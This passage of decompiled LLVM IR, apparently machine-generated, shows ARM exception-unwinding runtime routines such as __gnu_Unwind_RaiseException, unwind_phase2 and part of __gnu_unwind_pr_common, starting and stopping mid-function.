dec_label_pc_17c50:                               ; preds = %dec_label_pc_17bd0, %dec_label_pc_17c48
  br label %dec_label_pc_17b88

; uselistorder directives
  uselistorder i32 %v11_17b48, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32 304, { 1, 0 }
  uselistorder i32* @r3, { 105, 106, 41, 42, 30, 107, 108, 33, 109, 110, 3, 111, 112, 113, 4, 114, 115, 116, 5, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 0, 135, 136, 137, 138, 31, 32, 34, 35, 36, 37, 38, 39, 40, 81, 64, 65, 66, 139, 140, 153, 154, 155, 143, 144, 145, 146, 147, 1, 148, 6, 44, 45, 141, 142, 56, 57, 102, 103, 104, 96, 97, 98, 100, 99, 9, 10, 11, 159, 156, 157, 158, 2, 160, 161, 162, 43, 67, 46, 47, 48, 49, 50, 51, 149, 150, 151, 152, 58, 59, 60, 87, 88, 89, 90, 68, 69, 70, 8, 91, 92, 93, 94, 95, 24, 25, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 26, 27, 28, 29, 52, 53, 54, 101, 55, 61, 62, 63, 71, 7, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86 }
  uselistorder i32 10, { 4, 5, 31, 32, 33, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 34, 10, 26, 28, 11, 27, 12, 29, 13, 30, 23, 6, 35, 24, 14, 3, 25, 36, 15, 37, 38, 16, 17, 18, 41, 9, 46, 47, 48, 49, 50, 51, 52, 19, 53, 54, 55, 20, 56, 57, 58, 2, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 21, 73, 22 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_17c50, { 1, 0 }
  uselistorder label %dec_label_pc_17bf4, { 1, 0 }
  uselistorder label %dec_label_pc_17bf0, { 1, 0 }
  uselistorder label %dec_label_pc_17ba0, { 1, 0 }
  uselistorder label %dec_label_pc_17b8c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_17c64 = add i32 %ucbp, 12
  %v3_17c64 = inttoptr i32 %v2_17c64 to i32*
  store i32 %stop_fn, i32* %v3_17c64, align 4
  %v3_17c68 = add i32 %ucbp, 24
  %v4_17c68 = inttoptr i32 %v3_17c68 to i32*
  store i32 %tmp, i32* %v4_17c68, align 4
  %v1_17c6c = add i32 %entry_vrs, 60
  %v2_17c6c = inttoptr i32 %v1_17c6c to i32*
  %v3_17c6c = load i32, i32* %v2_17c6c, align 4
  %v2_17c74 = add i32 %entry_vrs, 64
  %v3_17c74 = inttoptr i32 %v2_17c74 to i32*
  store i32 %v3_17c6c, i32* %v3_17c74, align 4
  %v3_17c7c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_17c7c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_17c946 = add i32 %vrs, 64
  %v2_17c947 = inttoptr i32 %v1_17c946 to i32*
  %v3_17c948 = load i32, i32* %v2_17c947, align 4
  %v2_17c989 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_17c948)
  store i32 %v2_17c989, i32* %r0.global-to-local, align 4
  %v2_17c9c11 = icmp eq i32 %v2_17c989, 0
  br i1 %v2_17c9c11, label %dec_label_pc_17ca4, label %dec_label_pc_17cd4

dec_label_pc_17ca4:                               ; preds = %entry, %dec_label_pc_17ca4.dec_label_pc_17c90_crit_edge
  %v0_17ca4 = load i32, i32* @r5, align 4
  %v1_17ca4 = add i32 %v0_17ca4, 64
  %v2_17ca4 = inttoptr i32 %v1_17ca4 to i32*
  %v3_17ca4 = load i32, i32* %v2_17ca4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_17cac = load i32, i32* @r4, align 4
  %v2_17cac = add i32 %v1_17cac, 20
  %v3_17cac = inttoptr i32 %v2_17cac to i32*
  store i32 %v3_17ca4, i32* %v3_17cac, align 4
  %v0_17cb0 = load i32, i32* @r4, align 4
  %v1_17cb8 = add i32 %v0_17cb0, 16
  %v2_17cb8 = inttoptr i32 %v1_17cb8 to i32*
  %v3_17cb8 = load i32, i32* %v2_17cb8, align 4
  call void @__pseudo_branch(i32 %v3_17cb8)
  %v0_17cc4 = load i32, i32* %r0.global-to-local, align 4
  %v7_17cc4 = icmp eq i32 %v0_17cc4, 8
  br i1 %v7_17cc4, label %dec_label_pc_17ca4.dec_label_pc_17c90_crit_edge, label %dec_label_pc_17ccc

dec_label_pc_17ca4.dec_label_pc_17c90_crit_edge:  ; preds = %dec_label_pc_17ca4
  %v0_17c90.pre = load i32, i32* @r4, align 4
  %v0_17c94.pre = load i32, i32* @r5, align 4
  store i32 %v0_17c90.pre, i32* %r0.global-to-local, align 4
  %v1_17c94 = add i32 %v0_17c94.pre, 64
  %v2_17c94 = inttoptr i32 %v1_17c94 to i32*
  %v3_17c94 = load i32, i32* %v2_17c94, align 4
  %v2_17c98 = call i32 @get_eit_entry(i32 %v0_17c90.pre, i32 %v3_17c94)
  store i32 %v2_17c98, i32* %r0.global-to-local, align 4
  %v2_17c9c = icmp eq i32 %v2_17c98, 0
  br i1 %v2_17c9c, label %dec_label_pc_17ca4, label %dec_label_pc_17cd4

dec_label_pc_17ccc:                               ; preds = %dec_label_pc_17ca4
  %v7_17ccc = icmp eq i32 %v0_17cc4, 7
  br i1 %v7_17ccc, label %dec_label_pc_17cd8, label %dec_label_pc_17cd4

dec_label_pc_17cd4:                               ; preds = %entry, %dec_label_pc_17ca4.dec_label_pc_17c90_crit_edge, %dec_label_pc_17ccc
  %v0_17cd4 = call i32 @abort()
  store i32 %v0_17cd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cd8

dec_label_pc_17cd8:                               ; preds = %dec_label_pc_17ccc, %dec_label_pc_17cd4
  %v0_17cd8 = load i32, i32* @r5, align 4
  %v1_17cd8 = add i32 %v0_17cd8, 4
  store i32 %v1_17cd8, i32* %r0.global-to-local, align 4
  %v1_17cdc = inttoptr i32 %v1_17cd8 to i32*
  %v2_17cdc = call i32 @__restore_core_regs(i32* %v1_17cdc)
  store i32 %v2_17cdc, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 1, 2, 0 }
  uselistorder label %dec_label_pc_17cd8, { 1, 0 }
  uselistorder label %dec_label_pc_17cd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ca4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_17ce0 = add i32 %ucbp, 20
  %v2_17ce0 = inttoptr i32 %v1_17ce0 to i32*
  %v3_17ce0 = load i32, i32* %v2_17ce0, align 4
  %v1_17ce8 = load i32, i32* %r1.global-to-local, align 4
  %v2_17ce8 = add i32 %v1_17ce8, 64
  %v3_17ce8 = inttoptr i32 %v2_17ce8 to i32*
  store i32 %v3_17ce0, i32* %v3_17ce8, align 4
  %v1_17cec = add i32 %ucbp, 12
  %v2_17cec = inttoptr i32 %v1_17cec to i32*
  %v3_17cec = load i32, i32* %v2_17cec, align 4
  %v2_17cf0 = icmp eq i32 %v3_17cec, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_17cfc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17cfc, i32* @r5, align 4
  br i1 %v2_17cf0, label %dec_label_pc_17d04, label %dec_label_pc_17d40

dec_label_pc_17d04:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_17d10 = add i32 %ucbp, 16
  %v2_17d10 = inttoptr i32 %v1_17d10 to i32*
  %v3_17d10 = load i32, i32* %v2_17d10, align 4
  call void @__pseudo_branch(i32 %v3_17d10)
  br i1 false, label %dec_label_pc_17d38, label %dec_label_pc_17d24

dec_label_pc_17d24:                               ; preds = %dec_label_pc_17d04
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_12af0.529 to i32))
  %v0_17d2c = load i32, i32* @r4, align 4
  %v0_17d30 = load i32, i32* @r5, align 4
  store i32 %v0_17d30, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_17d2c, i32 %v0_17d30)
  br label %dec_label_pc_17d38

dec_label_pc_17d38:                               ; preds = %dec_label_pc_17d04, %dec_label_pc_17d24
  %v0_17d38 = load i32, i32* @r5, align 4
  %v1_17d38 = add i32 %v0_17d38, 4
  %v1_17d3c = inttoptr i32 %v1_17d38 to i32*
  %v2_17d3c = call i32 @__restore_core_regs(i32* %v1_17d3c)
  %v1_17d44.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_17d40

dec_label_pc_17d40:                               ; preds = %entry, %dec_label_pc_17d38
  %v1_17d44 = phi i32 [ %v0_17cfc, %entry ], [ %v1_17d44.pre, %dec_label_pc_17d38 ]
  %v3_17d44 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_17d44, i32 1)
  %v0_17d48 = call i32 @abort()
  ret i32 %v0_17d48

; uselistorder directives
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 42, 43, 44, 45, 46, 48, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 29, 53, 57, 56, 55, 49, 50, 37, 38, 39, 40, 41, 51, 52, 54, 32, 33, 47, 30, 34, 31, 23, 24, 0, 25, 26, 27, 28, 35, 36, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 95, 134, 4, 135, 136, 137, 138, 5, 80, 111, 139, 6, 79, 140, 7, 78, 141, 142, 143, 144, 8, 145, 112, 9, 82, 146, 10, 81, 147, 148, 11, 149, 150, 151, 12, 152, 153, 13, 154, 14, 114, 155, 156, 113, 157, 158, 15, 83, 16, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 18, 85, 19, 169, 170, 171, 20, 84, 172, 21, 17, 173, 174, 22, 175, 176, 177, 23, 178, 179, 180, 181, 182, 24, 25, 115, 26, 27, 28, 133, 86, 183, 184, 87, 185, 117, 186, 187, 30, 188, 189, 31, 88, 191, 29, 192, 190, 193, 116, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 90, 43, 44, 45, 46, 47, 212, 77, 91, 97, 198, 100, 99, 48, 194, 120, 195, 196, 51, 197, 89, 98, 199, 200, 201, 202, 92, 203, 204, 205, 206, 207, 52, 53, 208, 209, 49, 50, 210, 211, 119, 118, 54, 55, 56, 213, 57, 58, 101, 102, 107, 103, 108, 104, 106, 214, 105, 110, 215, 59, 216, 60, 217, 121, 122, 218, 123, 124, 219, 125, 126, 61, 62, 220, 127, 128, 63, 64, 221, 129, 130, 65, 66, 222, 131, 132, 67, 68, 96, 223, 224, 109, 225, 69, 93, 70, 71, 94, 72, 73, 74, 75, 76 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_17d40, { 1, 0 }
  uselistorder label %dec_label_pc_17d38, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17d4c = load i32, i32* @r4, align 4
  store i32 %v3_17d4c, i32* %stack_var_-16, align 4
  %v6_17d4c = load i32, i32* @r5, align 4
  %v9_17d4c = load i32, i32* @r6, align 4
  %v12_17d4c = load i32, i32* @lr, align 4
  %v1_17d50 = add i32 %entry_vrs, 60
  %v2_17d50 = inttoptr i32 %v1_17d50 to i32*
  %v3_17d50 = load i32, i32* %v2_17d50, align 4
  %v2_17d54 = add i32 %entry_vrs, 64
  %v3_17d54 = inttoptr i32 %v2_17d54 to i32*
  store i32 %v3_17d50, i32* %v3_17d54, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_17d84 = load i32, i32* %v3_17d54, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_17d9c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17d84)
  %v2_17da0 = icmp eq i32 %v2_17d9c, 0
  br i1 %v2_17da0, label %dec_label_pc_17da8, label %dec_label_pc_17ddc

dec_label_pc_17da8:                               ; preds = %entry
  %v0_17da8 = load i32, i32* @r5, align 4
  %v1_17db0 = add i32 %v0_17da8, 16
  %v2_17db0 = inttoptr i32 %v1_17db0 to i32*
  %v3_17db0 = load i32, i32* %v2_17db0, align 4
  call void @__pseudo_branch(i32 %v3_17db0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17dc8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_17dcc = urem i32 %v2_17dc8, 2
  %v2_17dcc = icmp eq i32 %v1_17dcc, 0
  br i1 %v2_17dcc, label %dec_label_pc_17dec, label %dec_label_pc_17dd4

dec_label_pc_17dd4:                               ; preds = %dec_label_pc_17da8, %dec_label_pc_17dec
  %v0_17dd4 = phi i1 [ false, %dec_label_pc_17da8 ], [ %phitmp, %dec_label_pc_17dec ]
  br i1 %v0_17dd4, label %dec_label_pc_17df8, label %dec_label_pc_17ddc

dec_label_pc_17ddc:                               ; preds = %entry, %dec_label_pc_17dd4
  %v2_17de4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17de4, i32* @r4, align 4
  store i32 %v6_17d4c, i32* @r5, align 4
  store i32 %v9_17d4c, i32* @r6, align 4
  store i32 %v12_17d4c, i32* @lr, align 4
  ret i32 9

dec_label_pc_17dec:                               ; preds = %dec_label_pc_17da8
  %v2_17dec = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_17dec, i32* @r0, align 4
  %v1_17df0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_17dec)
  %v0_17dd4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_17dd4.pre, 6
  br label %dec_label_pc_17dd4

dec_label_pc_17df8:                               ; preds = %dec_label_pc_17dd4
  %v0_17df8 = load i32, i32* @r5, align 4
  %v0_17dfc = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_17df8, i32 %v0_17dfc)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17ddc, { 1, 0 }
  uselistorder label %dec_label_pc_17dd4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_17e04 = add i32 %ucbp, 12
  %v2_17e04 = inttoptr i32 %v1_17e04 to i32*
  %v3_17e04 = load i32, i32* %v2_17e04, align 4
  %v2_17e08 = icmp eq i32 %v3_17e04, 0
  br i1 %v2_17e08, label %dec_label_pc_17e10, label %dec_label_pc_17e14

dec_label_pc_17e10:                               ; preds = %entry
  %v2_17e10 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_17e14

dec_label_pc_17e14:                               ; preds = %entry, %dec_label_pc_17e10
  %v1_17e14 = add i32 %entry_vrs, 60
  %v2_17e14 = inttoptr i32 %v1_17e14 to i32*
  %v3_17e14 = load i32, i32* %v2_17e14, align 4
  %v2_17e1c = add i32 %entry_vrs, 64
  %v3_17e1c = inttoptr i32 %v2_17e1c to i32*
  store i32 %v3_17e14, i32* %v3_17e1c, align 4
  %v3_17e20 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_17e20

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_17e14, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_17e80

bb:                                               ; preds = %entry
  %v7_17e38 = mul i32 %regclass, 4
  %v8_17e38 = add i32 %v7_17e38, ptrtoint (i32* @global_var_17e40.682 to i32)
  call void @__pseudo_branch(i32 %v8_17e38)
  br label %dec_label_pc_17e80

dec_label_pc_17e80:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_17f68 = load i32, i32* @r4, align 4
  %v6_17f68 = load i32, i32* @r5, align 4
  %v2_17f78 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_17f80 = add i32 %ucbp, 76
  %v2_17f80 = inttoptr i32 %v1_17f80 to i32*
  %v3_17f80 = load i32, i32* %v2_17f80, align 4
  %v1_17f8c = inttoptr i32 %v3_17f80 to i32*
  %v2_17f8c = load i32, i32* %v1_17f8c, align 4
  store i32 %v2_17f8c, i32* @lr, align 4
  %v4_17f8c = add i32 %v3_17f80, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_17f98 = urem i32 %state, 4
  store i32 %v1_17f98, i32* %r2.global-to-local, align 4
  %v1_17f9c = and i32 %state, 8
  store i32 %v1_17f9c, i32* %r0.global-to-local, align 4
  %v4_17fac = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_17f8c, i32* %v4_17fac, align 8
  br i1 %v2_17f78, label %dec_label_pc_17fbc, label %dec_label_pc_18298

dec_label_pc_17fbc:                               ; preds = %entry
  %v3_17fbc = mul i32 %v2_17f8c, 256
  store i32 %v3_17fbc, i32* %v4_17fac, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17fd4

dec_label_pc_17fd4:                               ; preds = %dec_label_pc_18298, %dec_label_pc_17fbc
  %v0_17ff8647090 = phi i32 [ %v2_182b0, %dec_label_pc_18298 ], [ %v4_17f8c, %dec_label_pc_17fbc ]
  store i32 %v1_17f98, i32* %r2.global-to-local, align 4
  %v1_17fd8 = add i32 %ucbp, 80
  %v2_17fd8 = inttoptr i32 %v1_17fd8 to i32*
  %v3_17fd8 = load i32, i32* %v2_17fd8, align 4
  %v7_17fdc = icmp eq i32 %v1_17f98, 2
  br i1 %v7_17fdc, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_17fd4
  %v2_17fe0 = add i32 %ucbp, 56
  %v3_17fe0 = inttoptr i32 %v2_17fe0 to i32*
  %v4_17fe0 = load i32, i32* %v3_17fe0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17fd4, %bb
  %v0_17ff86470 = phi i32 [ %v0_17ff8647090, %dec_label_pc_17fd4 ], [ %v4_17fe0, %bb ]
  %v1_17fe4 = urem i32 %v3_17fd8, 2
  %v2_17fe4 = icmp eq i32 %v1_17fe4, 0
  br i1 %v2_17fe4, label %dec_label_pc_17ff8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_180b8

dec_label_pc_17ff8.preheader:                     ; preds = %bb148
  %v1_17ff86571 = inttoptr i32 %v0_17ff86470 to i32*
  %v2_17ff86672 = load i32, i32* %v1_17ff86571, align 4
  %v2_17ffc6874 = icmp eq i32 %v2_17ff86672, 0
  br i1 %v2_17ffc6874, label %dec_label_pc_180b8, label %dec_label_pc_18004.preheader.lr.ph.lr.ph

dec_label_pc_18004.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_17ff8.preheader
  %v7_18008 = icmp eq i32 %id, 2
  %v2_18094 = icmp eq i32 %v1_17f98, 0
  %v2_18260 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1817c = icmp eq i32 %v1_17f9c, 0
  br label %dec_label_pc_18004.preheader.lr.ph

dec_label_pc_18004.preheader.lr.ph:               ; preds = %dec_label_pc_18004.preheader.lr.ph.lr.ph, %dec_label_pc_182cc
  %v1_1801496 = phi i32 [ %v2_17ff86672, %dec_label_pc_18004.preheader.lr.ph.lr.ph ], [ %v2_17ff866, %dec_label_pc_182cc ]
  %v1_1801093 = phi i32 [ %v0_17ff86470, %dec_label_pc_18004.preheader.lr.ph.lr.ph ], [ %v2_182d0, %dec_label_pc_182cc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18004.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_182cc ]
  br label %dec_label_pc_18004.preheader

dec_label_pc_18004.preheader:                     ; preds = %dec_label_pc_18004.preheader.lr.ph, %dec_label_pc_18290
  %v1_1801495 = phi i32 [ %v1_1801496, %dec_label_pc_18004.preheader.lr.ph ], [ %v2_17ff8, %dec_label_pc_18290 ]
  %v1_1801092 = phi i32 [ %v1_1801093, %dec_label_pc_18004.preheader.lr.ph ], [ %v1_18290, %dec_label_pc_18290 ]
  br label %dec_label_pc_18004

dec_label_pc_18004:                               ; preds = %dec_label_pc_18004.preheader, %dec_label_pc_180a8
  %v1_18014 = phi i32 [ %v1_1801495, %dec_label_pc_18004.preheader ], [ %v2_180ac, %dec_label_pc_180a8 ]
  %v1_18028 = phi i32 [ %v1_1801092, %dec_label_pc_18004.preheader ], [ %v1_180a8, %dec_label_pc_180a8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18008, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18004
  %v2_1800c = add i32 %v1_18028, 4
  %v3_1800c = inttoptr i32 %v2_1800c to i32*
  %v4_1800c = load i32, i32* %v3_1800c, align 4
  store i32 %v4_1800c, i32* @r5, align 4
  store i32 %v1_18014, i32* @r6, align 4
  %v0_18018109 = load i32, i32* @r8, align 4
  %v1_18018110 = add i32 %v0_18018109, 72
  %v2_18018111 = inttoptr i32 %v1_18018110 to i32*
  %v3_18018112 = load i32, i32* %v2_18018111, align 4
  store i32 %v3_18018112, i32* @lr, align 4
  %v2_18024 = add i32 %v1_18028, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18004
  %v2_18010 = add i32 %v1_18028, 2
  %v3_18010 = inttoptr i32 %v2_18010 to i16*
  %v4_18010 = load i16, i16* %v3_18010, align 2
  %v5_18010 = zext i16 %v4_18010 to i32
  store i32 %v5_18010, i32* @r5, align 4
  %v0_18018 = load i32, i32* @r8, align 4
  %v1_18018 = add i32 %v0_18018, 72
  %v2_18018 = inttoptr i32 %v1_18018 to i32*
  %v3_18018 = load i32, i32* %v2_18018, align 4
  store i32 %v3_18018, i32* @lr, align 4
  %v2_18020 = inttoptr i32 %v1_18028 to i16*
  %v3_18020 = load i16, i16* %v2_18020, align 2
  %v4_18020 = zext i16 %v3_18020 to i32
  store i32 %v4_18020, i32* @r6, align 4
  %v2_18028 = add i32 %v1_18028, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18028, %.thread16 ], [ %v2_18024, %bb151 ]
  %v3_18018115 = phi i32 [ %v3_18018, %.thread16 ], [ %v3_18018112, %bb151 ]
  %v0_18030113 = phi i32 [ %v5_18010, %.thread16 ], [ %v4_1800c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18030 = and i32 %v0_18030113, -2
  %v2_18034 = add i32 %v1_18030, %v3_18018115
  store i32 %v2_18034, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18044 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18044, i32* %r0.global-to-local, align 4
  %v5_18050 = call i32 @_Unwind_VRS_Get(i32 %v0_18044, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18050, i32* %r0.global-to-local, align 4
  %v3_18054 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18054, i32* %r2.global-to-local, align 4
  %v0_18058 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18058, %v3_18054
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18064

._crit_edge:                                      ; preds = %bb152
  %v0_1807c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18064:                               ; preds = %bb152
  %v0_18064 = load i32, i32* @r6, align 4
  %v1_18064 = and i32 %v0_18064, -2
  %v2_18068 = add i32 %v1_18064, %v0_18058
  %v3_1806c = icmp ult i32 %v3_18054, %v2_18068
  br i1 %v3_1806c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18064
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18064
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1807c = phi i32 [ %v0_1807c.pre, %._crit_edge ], [ %v0_18064, %bb153 ], [ %v0_18064, %.thread20 ]
  %v0_18224 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18078 = load i32, i32* @r5, align 4
  %v1_1807c = urem i32 %v0_1807c, 2
  %v1_18078 = mul i32 %v0_18078, 2
  %v3_18080 = and i32 %v1_18078, 2
  %v4_18080 = or i32 %v3_18080, %v1_1807c
  store i32 %v4_18080, i32* %r2.global-to-local, align 4
  %v7_18084 = icmp eq i32 %v4_18080, 1
  br i1 %v7_18084, label %dec_label_pc_18218, label %dec_label_pc_1808c

dec_label_pc_1808c:                               ; preds = %bb154
  %v2_18084 = icmp eq i32 %v4_18080, 0
  br i1 %v2_18084, label %dec_label_pc_18090, label %dec_label_pc_18140

dec_label_pc_18090:                               ; preds = %dec_label_pc_1808c
  store i32 %v1_17f98, i32* %r2.global-to-local, align 4
  br i1 %v2_18094, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18090
  %v0_180a8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_180a8

bb155:                                            ; preds = %dec_label_pc_18090
  %v2_180a0 = icmp eq i32 %v0_18224, 0
  %v0_180a8 = load i32, i32* @r7, align 4
  br i1 %v2_180a0, label %dec_label_pc_180a8, label %dec_label_pc_18420

dec_label_pc_180a8:                               ; preds = %.thread, %bb155
  %v0_180a8120 = phi i32 [ %v0_180a8119, %.thread ], [ %v0_180a8, %bb155 ]
  %v1_180a8 = add i32 %v0_180a8120, 4
  %v1_180ac = inttoptr i32 %v1_180a8 to i32*
  %v2_180ac = load i32, i32* %v1_180ac, align 4
  %v2_180b0 = icmp eq i32 %v2_180ac, 0
  br i1 %v2_180b0, label %dec_label_pc_180b8, label %dec_label_pc_18004

dec_label_pc_180b8:                               ; preds = %dec_label_pc_182cc, %dec_label_pc_18290, %dec_label_pc_180a8, %dec_label_pc_17ff8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_17ff8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_180a8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18290 ], [ %stack_var_-76.4, %dec_label_pc_182cc ]
  %v0_180b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_180b8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_180c0 = call i32 @__gnu_unwind_execute(i32 %v0_180b8, %anon_struct_13* %tmp156)
  store i32 %v4_180c0, i32* %r0.global-to-local, align 4
  store i32 %v4_180c0, i32* %r5.global-to-local, align 4
  %v2_180c4 = icmp eq i32 %v4_180c0, 0
  br i1 %v2_180c4, label %dec_label_pc_180cc, label %dec_label_pc_18148

dec_label_pc_180cc:                               ; preds = %dec_label_pc_180b8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_180d0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_180d0, label %bb157, label %dec_label_pc_180dc

bb157:                                            ; preds = %dec_label_pc_180cc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1814c

dec_label_pc_180dc:                               ; preds = %dec_label_pc_180cc
  %v2_180dc = ptrtoint i32* %stack_var_-48 to i32
